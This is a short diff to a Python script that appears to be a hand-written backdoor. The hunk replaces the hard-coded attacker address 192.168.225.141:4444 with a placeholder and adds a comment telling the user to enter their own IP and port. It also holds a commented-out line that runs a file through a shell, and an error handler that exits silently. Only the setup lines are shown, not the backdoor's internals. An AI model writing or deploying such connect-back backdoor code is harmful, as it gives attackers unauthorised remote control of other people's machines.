@@ -74,7 +74,7 @@ class Backdoor:
 # subprocess.Popen(file_name, shell=True)
  
 try:
-    my_backdoor = Backdoor("192.168.225.141", 4444)
+    my_backdoor = Backdoor("255.255.255.255", 4444) # enter the ip address of your device as the first argument and the port number as the second argument. 
     my_backdoor.run()
 except Exception:
     sys.exit()
